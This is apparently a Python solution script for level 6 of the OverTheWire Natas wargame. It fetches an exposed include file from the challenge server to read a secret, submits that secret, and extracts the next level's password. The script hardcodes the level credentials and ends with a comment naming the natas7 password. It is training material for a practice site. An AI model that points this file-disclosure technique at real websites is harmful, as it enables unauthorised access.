# natas6

import requests
from pwn import log
import re

url = 'http://natas6.natas.labs.overthewire.org'
username = "natas6"
password = "0RoJwHdSKWFTYR5WuiAewauSuNaBXned"
auth = (username, password)
secret = "FOEIUWGHFEEUHOFUOIU"

data = {
    'secret': secret,
    'submit': 'Submit'
}
def exploit():
    res = requests.get(f'{url}/includes/secret.inc', auth=auth)
    log.info(res.text)
    res = requests.post(url, data=data, auth=auth)
    flag = re.findall('.*natas7.*', res.text)
    log.info(flag)

if __name__ == '__main__':
    exploit()

# natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS